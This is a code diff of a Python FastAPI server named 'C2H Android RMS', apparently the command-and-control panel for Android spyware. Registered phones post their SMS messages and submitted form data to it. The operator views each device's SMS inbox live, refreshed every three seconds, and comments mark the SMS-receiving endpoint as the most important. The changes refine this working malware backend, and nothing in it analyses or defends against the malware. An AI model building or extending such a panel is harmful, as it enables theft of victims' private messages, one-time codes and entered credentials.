@@ -25,6 +25,7 @@ def init_db():
     conn = get_db_connection()
     cursor = conn.cursor()
     
+    # Devices table
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS devices (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -38,6 +39,7 @@ def init_db():
         );
     """)
     
+    # Commands table
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS commands (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -49,6 +51,7 @@ def init_db():
         );
     """)
 
+    # SMS logs table - यही important है
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS sms_logs (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -58,7 +61,12 @@ def init_db():
             received_at DATETIME NOT NULL
         );
     """)
+    
+    # Add index for faster queries
+    cursor.execute("CREATE INDEX IF NOT EXISTS idx_sms_device ON sms_logs (device_id);")
+    cursor.execute("CREATE INDEX IF NOT EXISTS idx_sms_date ON sms_logs (received_at DESC);")
 
+    # Form submissions table
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS form_submissions (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -68,6 +76,7 @@ def init_db():
         );
     """)
 
+    # Global settings table
     cursor.execute("""
         CREATE TABLE IF NOT EXISTS global_settings (
             setting_key TEXT PRIMARY KEY UNIQUE NOT NULL,
@@ -86,6 +95,7 @@ def init_db():
     conn.commit()
     conn.close()
 
+# Initialize database
 init_db()
 
 # --- Pydantic Models ---
@@ -128,10 +138,8 @@ class SmsLogRequest(BaseModel):
 # --- FastAPI Application ---
 app = FastAPI(title="C2H Android RMS")
 
-# --- API Endpoints ---
-@app.get("/", response_class=HTMLResponse)
-async def get_panel():
-    return HTMLResponse(content="""
+# --- HTML Panel (सीधा यहीं) ---
+HTML_PANEL = """
 <!DOCTYPE html>
 <html lang="hi">
 <head>
@@ -160,7 +168,7 @@ async def get_panel():
             font-size: 2em;
         }
         
-        /* टॉप बटन सेक्शन */
+        /* टॉप बटन */
         .top-buttons {
             display: flex;
             gap: 15px;
@@ -324,7 +332,6 @@ async def get_panel():
         /* डिवाइस डिटेल पेज */
         .device-detail-page {
             display: none;
-            min-height: 100vh;
         }
         .device-detail-page.active {
             display: block;
@@ -385,6 +392,8 @@ async def get_panel():
             padding: 15px;
             border-bottom: 1px solid #e0e0e0;
             margin-bottom: 10px;
+            background: #f9f9f9;
+            border-radius: 8px;
         }
         .sms-item:last-child {
             border-bottom: none;
@@ -393,15 +402,19 @@ async def get_panel():
             font-weight: bold;
             color: #1a237e;
             margin-bottom: 5px;
+            font-size: 1.1em;
         }
         .sms-message {
             color: #333;
             margin-bottom: 5px;
             white-space: pre-wrap;
+            font-size: 1em;
+            line-height: 1.5;
         }
         .sms-time {
             font-size: 0.8em;
             color: #999;
+            text-align: right;
         }
         .form-data-list {
             background: white;
@@ -418,6 +431,19 @@ async def get_panel():
             text-align: center;
             padding: 50px;
             color: #999;
+        }
+        .loading {
+            text-align: center;
+            padding: 30px;
+            color: #666;
+        }
+        .sms-count {
+            background: #1a237e;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            margin-left: 10px;
         }
     </style>
 </head>
@@ -438,7 +464,7 @@ async def get_panel():
         <!-- डिवाइस लिस्ट -->
         <h2>📱 Registered Devices <span id="deviceCount">(0)</span></h2>
         <div id="deviceGrid" class="device-grid">
-            <div class="no-data">Loading devices...</div>
+            <div class="loading">Loading devices...</div>
         </div>
     </div>
 
@@ -458,9 +484,9 @@ async def get_panel():
             </div>
             
             <!-- SMS लिस्ट -->
-            <h3>📨 SMS Inbox</h3>
+            <h3>📨 SMS Inbox <span id="smsCount" class="sms-count">0</span></h3>
             <div id="smsList" class="sms-list">
-                <div class="no-data">Loading SMS...</div>
+                <div class="loading">Loading SMS...</div>
             </div>
         </div>
     </div>
@@ -533,6 +559,7 @@ async def get_panel():
     <script>
         let currentDeviceId = null;
         let refreshInterval = null;
+        let smsRefreshInterval = null;
 
         // पेज लोड
         document.addEventListener('DOMContentLoaded', function() {
@@ -552,6 +579,10 @@ async def get_panel():
         function showMainPage() {
             document.getElementById('mainPage').style.display = 'block';
             document.getElementById('deviceDetailPage').classList.remove('active');
+            if (smsRefreshInterval) {
+                clearInterval(smsRefreshInterval);
+                smsRefreshInterval = null;
+            }
         }
 
         function showDevicePage(deviceId) {
@@ -559,6 +590,10 @@ async def get_panel():
             document.getElementById('mainPage').style.display = 'none';
             document.getElementById('deviceDetailPage').classList.add('active');
             loadDeviceDetails(deviceId);
+            
+            // हर 3 सेकंड में SMS रिफ्रेश
+            if (smsRefreshInterval) clearInterval(smsRefreshInterval);
+            smsRefreshInterval = setInterval(() => loadDeviceSMS(deviceId), 3000);
         }
 
         // कॉन्फिग लोड
@@ -593,7 +628,6 @@ async def get_panel():
                 let html = '';
                 devices.forEach(device => {
                     const statusClass = device.is_online ? 'online' : 'offline';
-                    const batteryClass = device.battery_level < 20 ? 'low' : '';
                     
                     html += `
                         <div class="device-card ${statusClass}" onclick="showDevicePage('${device.device_id}')">
@@ -623,6 +657,37 @@ async def get_panel():
             }
         }
 
+        // Device SMS लोड करें (अलग function)
+        async function loadDeviceSMS(deviceId) {
+            try {
+                const smsRes = await fetch(`/api/device/${deviceId}/sms`);
+                const smsLogs = await smsRes.json();
+                
+                document.getElementById('smsCount').textContent = smsLogs.length;
+                
+                if (smsLogs.length === 0) {
+                    document.getElementById('smsList').innerHTML = '<div class="no-data">No SMS messages yet</div>';
+                    return;
+                }
+                
+                let smsHtml = '';
+                smsLogs.forEach(sms => {
+                    smsHtml += `
+                        <div class="sms-item">
+                            <div class="sms-sender">From: ${escapeHtml(sms.sender)}</div>
+                            <div class="sms-message">${escapeHtml(sms.message_body)}</div>
+                            <div class="sms-time">${escapeHtml(sms.received_at)}</div>
+                        </div>
+                    `;
+                });
+                
+                document.getElementById('smsList').innerHTML = smsHtml;
+                
+            } catch (error) {
+                console.error('SMS load error:', error);
+            }
+        }
+
         // डिवाइस डिटेल लोड
         async function loadDeviceDetails(deviceId) {
             try {
@@ -637,25 +702,7 @@ async def get_panel():
                 }
                 
                 // SMS लोड
-                const smsRes = await fetch(`/api/device/${deviceId}/sms`);
-                const smsLogs = await smsRes.json();
-                
-                let smsHtml = '';
-                if (smsLogs.length === 0) {
-                    smsHtml = '<div class="no-data">No SMS messages yet</div>';
-                } else {
-                    smsLogs.forEach(sms => {
-                        smsHtml += `
-                            <div class="sms-item">
-                                <div class="sms-sender">From: ${escapeHtml(sms.sender)}</div>
-                                <div class="sms-message">${escapeHtml(sms.message_body)}</div>
-                                <div class="sms-time">${escapeHtml(sms.received_at)}</div>
-                            </div>
-                        `;
-                    });
-                }
-                
-                document.getElementById('smsList').innerHTML = smsHtml;
+                await loadDeviceSMS(deviceId);
                 
             } catch (error) {
                 console.error('Device details error:', error);
@@ -668,6 +715,9 @@ async def get_panel():
             
             const modal = document.getElementById('formDataModal');
             const list = document.getElementById('formDataList');
+            
+            list.innerHTML = '<div class="loading">Loading...</div>';
+            modal.classList.add('active');
             
             try {
                 const res = await fetch(`/api/device/${currentDeviceId}/forms`);
@@ -687,10 +737,8 @@ async def get_panel():
                     });
                     list.innerHTML = html;
                 }
-                
-                modal.classList.add('active');
             } catch (error) {
-                alert('Error loading form data');
+                list.innerHTML = '<div class="no-data">Error loading form data</div>';
             }
         }
 
@@ -827,13 +875,19 @@ async def get_panel():
         // Cleanup
         window.onbeforeunload = function() {
             if (refreshInterval) clearInterval(refreshInterval);
+            if (smsRefreshInterval) clearInterval(smsRefreshInterval);
         };
     </script>
 </body>
 </html>
-    """)
+"""
 
-# --- API Endpoints (same as before) ---
+@app.get("/", response_class=HTMLResponse)
+async def get_panel():
+    return HTMLResponse(content=HTML_PANEL)
+
+# --- API Endpoints ---
+
 @app.post("/api/device/register")
 async def register_device(data: DeviceRegisterRequest):
     conn = get_db_connection()
@@ -989,8 +1043,10 @@ async def get_form_submissions(device_id: str):
     conn.close()
     return [{"id": form['id'], "custom_data": form['custom_data'], "submitted_at": form['submitted_at']} for form in forms]
 
+# ★★★ यह सबसे important endpoint है - यही SMS receive करता है ★★★
 @app.post("/api/device/{device_id}/sms")
 async def log_sms(device_id: str, data: SmsLogRequest):
+    print(f"📨 SMS received from device {device_id}: {data.sender} - {data.message_body}")
     conn = get_db_connection()
     cursor = conn.cursor()
     cursor.execute(
@@ -1001,14 +1057,29 @@ async def log_sms(device_id: str, data: SmsLogRequest):
     conn.close()
     return {"status": "success"}
 
+# ★★★ यह endpoint SMS लिस्ट लौटाता है ★★★
 @app.get("/api/device/{device_id}/sms")
 async def get_sms_logs(device_id: str):
     conn = get_db_connection()
     cursor = conn.cursor()
-    cursor.execute("SELECT id, sender, message_body, received_at FROM sms_logs WHERE device_id = ? ORDER BY received_at DESC LIMIT 500", (device_id.strip(),))
+    cursor.execute(
+        "SELECT id, sender, message_body, received_at FROM sms_logs WHERE device_id = ? ORDER BY received_at DESC LIMIT 500", 
+        (device_id.strip(),)
+    )
     sms_logs = cursor.fetchall()
     conn.close()
-    return [{"id": sms['id'], "sender": sms['sender'], "message_body": sms['message_body'], "received_at": sms['received_at']} for sms in sms_logs]
+    
+    result = []
+    for sms in sms_logs:
+        result.append({
+            "id": sms['id'],
+            "sender": sms['sender'],
+            "message_body": sms['message_body'],
+            "received_at": sms['received_at']
+        })
+    
+    print(f"📤 Returning {len(result)} SMS for device {device_id}")
+    return result
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8000))
